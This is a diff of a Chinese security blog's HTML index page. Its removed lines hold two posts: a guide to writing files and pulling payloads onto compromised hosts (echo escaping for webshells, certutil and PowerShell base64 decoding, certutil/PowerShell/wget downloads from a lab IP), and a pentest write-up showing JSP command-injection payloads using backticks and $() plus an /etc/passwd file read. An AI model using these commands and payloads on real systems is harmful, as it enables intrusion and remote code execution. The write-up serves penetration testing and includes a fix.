-<p><img src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-14.png"><br><img src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-34.png"><br><img src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-40.png"><br><img src="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/2020-08-20-17-36-47.png"></p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://laucyun.com/a6cb3c752b0fc10f0a9eeef01f7a5f76.html">通过Metasploit实现对MS17-010漏洞的利用</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/08/16/Metasploit%E5%88%A9%E7%94%A8Eternalblue-Doublepulsar/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -745,7 +804,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 17:29:33" itemprop="dateModified" datetime="2020-08-20T17:29:33+08:00">2020-08-20</time>
+                <time title="修改时间：2020-08-20 19:24:32" itemprop="dateModified" datetime="2020-08-20T19:24:32+08:00">2020-08-20</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -771,46 +830,14 @@
           <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文总结了一些通过<code>cmd</code>或者<code>bash</code>等<code>shell</code>写文件的方法，如在某些情况下，拿到了<code>cmd shell</code>或者<code>bash shell</code>，如下图：<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-00-21.png"></p>
 <p>但是靶机无法上公网和反连攻击机，然后通过<code>echo</code>等方式写<code>shell</code>的方法。受限于本人有限的知识面以及实用性等考量，这里列出的方法并不全面，仅供参考。</p>
-<h3 id="Windows-下写文件"><a href="#Windows-下写文件" class="headerlink" title="Windows 下写文件"></a>Windows 下写文件</h3><h4 id="echo写文件"><a href="#echo写文件" class="headerlink" title="echo写文件"></a>echo写文件</h4><p>这是最原始的方法，比较折腾人。如果你以为只要<code>echo 1 &gt; 1.txt</code>这样写入，就图样了。Windows下的<code>cmd echo</code>写入需要特殊字符转义，如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt; --- ^&lt;</span><br><span class="line">&gt; --- ^&gt;</span><br><span class="line">/ --- ^/</span><br><span class="line">+ --- ^+</span><br></pre></td></tr></table></figure>
-<p>另外，由于web服务器自动转码<code>URL编码</code>，把原本不是URL编码的字符转码了，导致写入的文件错误，所以还需对下面的字符转码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% --&gt; %25    # --&gt; %23    @ --&gt; %40</span><br><span class="line">+ --&gt; %2b    | --&gt; %7c    &amp; --&gt; ^%26</span><br></pre></td></tr></table></figure>
-<p><code>冰蝎</code>马使用这种方法转码的效果如下：<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-27.png"><br>然后通过<code>echo &lt;转码后的payload&gt; &gt; path/xxx.ext</code>写入文件，示例如下：<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-02-56.png"><br>局限性：</p>
-<ul>
-<li><p>Echo 字符数量有限，依赖于具体的浏览器也依赖于 web 服务器，当然还有万恶的 IDS。</p>
-</li>
-<li><p>IE 在地址栏的字符数上限是 2048 个字符</p>
-</li>
-<li><p>Chrome 没有明显的上限, 超过 1M 的内容也可以轻松接受</p>
-</li>
-<li><p>Firefox 没有明显的上限, 超过 5M 的内容也可以轻松接受</p>
-</li>
-<li><p>LinuxWin tomcat jboss 接受的 URL 最大长度是 7800</p>
-</li>
-<li><p>Windows Tomcat URL7825</p>
-</li>
-<li><p>Windows PHP Apache URL 最大长度为 8193<br>IIS6 ASP URL 最大长度为 15973</p>
-</li>
-</ul>
-<h4 id="certutil-base64解码写入"><a href="#certutil-base64解码写入" class="headerlink" title="certutil base64解码写入"></a>certutil base64解码写入</h4><p>上面提到<code>echo</code>写入万恶的转义问题，那么，通过base64编码是不是可以解决这烦人的转义问题呢？是的！<br>比如，我们要把<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（base64编码为：<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>）写入文件，可用如下方法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== &gt; 1.txt</span><br><span class="line">certutil.exe -decode 1.txt 2.jsp</span><br></pre></td></tr></table></figure>
-<p>这时候<code>2.jsp</code>就是要写入的内容：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat 2.jsp</span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>顺带一提，<code>certutil</code>下载文件的方法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f &lt;url&gt;</span><br><span class="line">示例：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt</span><br><span class="line">或者：</span><br><span class="line">certutil.exe -urlcache -split -f http://192.168.245.130:8080/1.txt 2.txt</span><br></pre></td></tr></table></figure>
-<p>不幸的是，<strong>即使下载的不是有毒文件，杀软还是很可能会杀掉：</strong><br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-05-57.png"><br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-02.png"></p>
-<h4 id="powershell-base64写入"><a href="#powershell-base64写入" class="headerlink" title="powershell base64写入"></a>powershell base64写入</h4><p><code>powershell</code>写入的方法就简单得多，如下：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#x27;</span></span><br><span class="line">[<span class="type">System.Text.Encoding</span>]::ASCII.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$data</span>))</span><br></pre></td></tr></table></figure>
-<p>效果如下，在后面加上重定向符即可写入文件:<br><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-06-50.png"></p>
-<h4 id="powershell下载文件"><a href="#powershell下载文件" class="headerlink" title="powershell下载文件"></a>powershell下载文件</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">打印远程文件到控制台：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">或者：</span><br><span class="line">powershell <span class="literal">-c</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>)</span><br><span class="line">直接下载文件：  </span><br><span class="line">(<span class="built_in">New-Object</span> Net.WebClient).DownloadFileAsync(<span class="string">&#x27;http://192.168.245.130:8080/1.txt&#x27;</span>, <span class="string">&#x27;1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/2020-08-20-17-07-43.png"></p>
-<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>因为Linux一般都自带base64命令，这里就不讨论转义的问题了。</p>
-<h4 id="bash-base64写入"><a href="#bash-base64写入" class="headerlink" title="bash base64写入"></a>bash base64写入</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== |base64 -d &gt; 1.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id="wget-下载"><a href="#wget-下载" class="headerlink" title="wget 下载"></a>wget 下载</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.245.130:8080/1.txt -O 1.jsp</span><br></pre></td></tr></table></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="http://rinige.com/index.php/archives/794/">CMD SHELL ECHO 写文件</a><br><a target="_blank" rel="noopener" href="https://codeday.me/bug/20190305/738026.html">用powershell解码base64</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/08/15/SHELL%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -985,104 +1012,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ryaninf.github.io/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.jpg">
-      <meta itemprop="name" content="r0yanx">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="r0yanx's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/" class="post-title-link" itemprop="url">记一次远程命令执行漏洞的挖掘过程</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2019-07-15 16:24:48" itemprop="dateCreated datePublished" datetime="2019-07-15T16:24:48+08:00">2019-07-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-08-20 16:39:26" itemprop="dateModified" datetime="2020-08-20T16:39:26+08:00">2020-08-20</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近为甲方做渗透测试发现了一个远程命令执行漏洞，可以通过构造恶意参数传递执行bash命令，本文回顾一下漏洞的挖掘过程。</p>
-<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ol>
-<li>通过<code>nessus</code>扫描器的<code>Sitemap</code>模块，发现了可疑目录：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-26.png"></li>
-<li>根据<code>sitemap</code>的目录信息，打开URL:<code>http://x.x.x.x:28076/file/</code>，发现存在未授权访问漏洞：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-26-57.png"></li>
-<li>逐个查看里面的文件，找到了一些比较有意思的JSP：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-27-22.png"></li>
-<li>蒙了一下<code>dirFiles.jsp</code>的参数，发现使用<code>path</code>作为参数名可列出目录、文件信息，URL：<code>http://x.x.x.x:28076/file/dirFiles.jsp?path=.</code><br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-28-24.png"></li>
-<li>同样的方法，发现<code>show.jsp</code>存在任意文件读取漏洞，URL：<code>http://x.x.x.x:28076/file/show.jsp?path=/etc/passwd</code><br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-00.png"></li>
-<li>结合上面的目录信息和任意文件读取漏洞，对JSP文件简单审计一下，发现<code>logContentNewest.jsp</code>会调用一个<code>bash</code>脚本，便猜想能否使用它构造命令执行：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-29-32.png"></li>
-</ol>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ol>
-<li><code>logContentNewest.jsp</code>正常执行是这样的，可自定义<code>path</code>参数的值，如<code>/etc/passwd</code>，来查找这个文件里面的内容：<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-30-15.png"></li>
-<li>分析<code>logContentNewest.jsp</code>和被调用的sh脚本，得知<code>path</code>参数最终会传入sh脚本的<code>FILE_PATH</code>变量，然后调用下面的判断逻辑。从下面代码我们可以看到，函数的功能是判断<code>FILE_PATH</code>变量的值是否存在，而这个变量的值目前是可控的<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-00.png"></li>
-<li>最初想通过添加双引号闭合if条件判断参数注入命令，没有成功<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload： &#x2F;etc&#x2F;passwd&quot; ];ls;then echo 1;fi;if [ -e &quot;123.txt;</span><br></pre></td></tr></table></figure>
-<img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-31-44.png"></li>
-<li>从上图可以看到，payload的双引号不见了，在自己的Linux测试一下，发现bash在这种情况下会过滤双引号，因此排除了存在过滤双引号的可能<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-32-11.png"></li>
-<li>经过多次测试，最终可用反引号<code>`</code>或者<code>$()</code>进行命令执行，如<code>ifconfig</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig&#96;&quot;</span><br></pre></td></tr></table></figure></li>
-<li>命令结果的回显是因为判断不存在<code>FILA_PATH</code>文件名的文件后，会把变量值返回，其源码如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;the file($FILE_PATH) dose not exist!&quot;</span><br></pre></td></tr></table></figure>
-<strong>拓展知识：</strong> Linux bash中可以使用反引号<code>`</code>或者<code>$()</code>等方式将bash命令的执行结果保存到变量中，如<code>a=$(ifconfig)</code></li>
-<li>命令执行结果显示不完整，只能看到返回的第一行的结果，没关系，可以简单优化一下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&quot;&#96;ifconfig |xargs&#96;&quot;</span><br></pre></td></tr></table></figure>
-<strong>拓展知识：</strong> <code>xargs</code>可以将stdin中以空格或换行符进行分隔的数据，形成以空格分隔的参数（arguments），传递给其他命令。因为以空格作为分隔符，所以有一些文件名或者其他意义的名词内含有空格的时候，<code>xargs</code>可能会误判。简单来说，<code>xargs</code>是给其他命令传递参数的一个过滤器，是构建单行命令的重要组件之一。 但是这里仅仅只是通过<code>xargs</code>的特性让它把多行内容转换成一行来更好地显示结果，当然也可以使用其他方法来实现。<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-36-28.png"></li>
-<li>再看看nmap内网扫描的结果，同样的漏洞组件在内网中还发现了很多…<br><img src="/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/2020-08-20-16-37-07.png"></li>
-</ol>
-<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>漏洞是由于程序调用bash脚本传参时没有做过滤，通过$(cmd)这样的方式来执行命令并将结果存入变量中，在脚本判断文件不存在时会返回文件名，造成了回显。</p>
-<h3 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h3><p>严格控制文件名参数值，先判断文件名或文件路径是否合法可修复漏洞。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1154,7 +1083,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-count">17</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
